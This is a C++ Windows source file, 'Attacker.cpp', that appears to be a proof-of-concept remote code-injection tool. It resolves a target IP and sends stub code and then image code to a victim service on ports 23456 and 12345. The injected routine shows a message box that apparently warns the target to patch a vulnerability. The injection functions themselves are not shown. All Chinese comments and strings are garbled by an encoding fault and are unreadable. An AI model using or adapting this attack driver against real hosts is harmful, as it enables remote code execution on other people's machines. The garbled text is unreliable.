// Attacker.cpp : ����Ӧ�ó������ڵ㡣
//

#include "Attacker.h"

DWORD GetComputerIpAddr(LPCTSTR szComputer)
{
#ifdef UNICODE
	char szName[16];
	wcstombs(szName, szComputer, sizeof(szName));
#else
	LPCSTR szName = szComputer;
#endif

	HOSTENT* pHost = gethostbyname(szName);
	if(pHost == NULL)
		return 0;

	return ntohl(((LPIN_ADDR)(pHost->h_addr_list[0]))->s_addr);
}

int APIENTRY _tWinMain(HINSTANCE hInst, HINSTANCE, LPTSTR, int)
{
	g_hInst = hInst;

	BOOL bSucc = FALSE;
	WSADATA wsa;
	if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		MessageBox(NULL, _T("�����ʼ��ʧ��!"), NULL, MB_OK|MB_ICONHAND);
		return -1;
	}

	DWORD dwVictimIp = (127<<24) + (0<<16) + (0<<8) + 1;
	if(__argc >= 2)
		dwVictimIp = GetComputerIpAddr(__targv[1]);

	if(InjectStubCode(dwVictimIp, 23456))
	{
		//�Ե�һ��,�ܺ�������ִ��stub����
		Sleep(500);
		bSucc = InjectImageCode(dwVictimIp, 12345);
	}

	MessageBox(NULL, bSucc ? _T("�����ɹ�") : _T("����ʧ��"), _T("������"), MB_OK|MB_ICONINFORMATION);

	WSACleanup();

	return 0;
}

DWORD WINAPI AttackerMain(HINSTANCE hInst)
{
	TCHAR szName[64], szMsg[128];
	GetModuleFileName(NULL, szName, sizeof(szName)/sizeof(TCHAR));
	_stprintf(szMsg, _T("����\"%s\"���ڻ��������©��,�Ͻ��򲹶���!"), szName);
	MessageBox(NULL, szMsg, _T("����"), MB_OK|MB_ICONINFORMATION);
	return 0;
}
